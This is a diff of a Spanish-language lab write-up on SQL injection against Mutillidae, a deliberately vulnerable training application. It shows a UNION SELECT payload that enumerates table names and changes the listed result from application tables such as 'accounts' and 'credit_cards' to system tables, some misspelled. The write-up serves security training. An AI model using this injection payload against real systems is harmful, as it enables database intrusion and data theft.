@@ -447,17 +447,12 @@ mutillidae
 ' UNION SELECT null,table_name,null,null,null,null,null FROM information_schema.tables WHERE table_schema='mutillidae'-- 
 ```
 
-**Resultado (12 tablas):**
+**Resultado (355 tablas):**
 ```
-accounts
-blogs_table
-captured_data
-credit_cards
-hitlog
-page_help
-page_hints
-pen_test_tools
-user_poll_results
+ADMNISTRABLE_ROLE_AUTHORIZATIONS
+APPLICABLE_ROLES
+CHARACTER_SETS
+CHECK_CONTRAINTS
 ...
 ```
 
